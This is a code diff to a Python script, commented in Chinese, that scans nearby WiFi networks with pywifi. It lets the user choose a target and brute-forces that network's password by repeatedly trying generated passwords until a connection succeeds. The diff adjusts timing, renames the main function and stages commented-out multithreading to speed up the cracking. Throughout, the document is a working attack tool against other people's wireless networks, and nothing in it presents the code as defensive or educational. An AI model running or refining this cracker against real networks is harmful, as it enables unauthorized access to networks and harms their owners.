@@ -3,6 +3,7 @@ import time
 from pywifi import const
 import string
 import random
+import threading
 
 
 # WiFi扫描模块
@@ -40,7 +41,7 @@ def wifi_scan():
 
 
 # WIFI破解模块
-def wifi_password_crack(wifi_name,pwd_len):
+def wifi_password_crack(wifi_name, pwd_len):
     # 创建wifi对象
     wifi = pywifi.PyWiFi()
     # 创建网卡对象，为第一个wifi网卡
@@ -70,27 +71,27 @@ def wifi_password_crack(wifi_name,pwd_len):
         # 设置新的wifi连接文件
         tmp_profile = interface.add_network_profile(profile)
         # 开始尝试连接
+        print(f'\r正在利用密码 {pwd} 尝试破解 ing...')
         interface.connect(tmp_profile)
-        print(f'\r正在利用密码 {pwd} 尝试破解。', end='')
+        time.sleep(5)
+        # if time.time() - start_time < 2:
         if interface.status() == 4:
             print(f'\r连接成功！密码为：{pwd}')
             exit(0)
             print()
-        # while time.time() - start_time < 2:
-        #     print(start_time)
-        #     # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
-        #     else:
+            # print(start_time)
+            # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
 
 
 # 主函数
-def pwd4wifi():
+def pwd4wifi_service(pwd_len):
     # 退出标致
     exit_flag = 0
     # 目标编号
     target_num = -1
     while not exit_flag:
         try:
-            print('WiFi万能钥匙'.center(35, '-'))
+            print('WiFi密码破解'.center(35, '-'))
             # 调用扫描模块，返回一个排序后的wifi列表
             wifi_list = wifi_scan()
             # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理
@@ -123,7 +124,12 @@ def pwd4wifi():
                 except ValueError:
                     print('只能输入数字哦o(*￣︶￣*)o')
             # 密码破解，传入用户选择的wifi名称
-            wifi_password_crack(wifi_list[target_num][1],pwd_len=8)
+            # 第一个参数是方法，第二个参数是方法的参数
+            # t1 = threading.Thread(target=wifi_password_crack, args=(wifi_list[target_num][1], pwd_len,))  # target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在
+            # t2 = threading.Thread(target=wifi_password_crack, args=(wifi_list[target_num][1], pwd_len,))  # target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在
+            # t1.start()
+            # t2.start()
+            wifi_password_crack(wifi_list[target_num][1], pwd_len)
             print('-' * 38)
             exit_flag = 1
         except Exception as e:
@@ -132,4 +138,4 @@ def pwd4wifi():
 
 
 if __name__ == '__main__':
-    pwd4wifi()
+    pwd4wifi_service(pwd_len=8)
